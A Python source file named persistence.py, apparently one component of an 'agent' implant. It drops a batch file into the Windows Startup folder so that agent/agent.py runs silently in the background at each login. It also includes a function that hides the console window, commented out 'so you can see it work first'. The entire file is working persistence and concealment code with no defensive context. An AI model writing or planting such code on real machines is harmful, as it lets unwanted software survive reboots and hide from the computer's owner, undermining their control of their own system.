# persistence.py
import os
import sys
import ctypes

def add_to_startup():
    # Target the agent script specifically
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    agent_path = os.path.join(base_dir, "agent", "agent.py")
    
    if not os.path.exists(agent_path):
        print(f"Error: Agent path {agent_path} not found.")
        return

    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Ensure folder exists (though AppData startup usually does)
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder, exist_ok=True)

    with open(os.path.join(startup_folder, "agent_startup.bat"), "w") as file:
        file.write(f"@echo off\nstart /B {sys.executable} \"{agent_path}\"")
    print(f"Persistence added: {startup_folder}\\agent_startup.bat")

def hide_console():
    # Hide the console window
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":
    add_to_startup()
    # hide_console() # Commented out so you can see it work first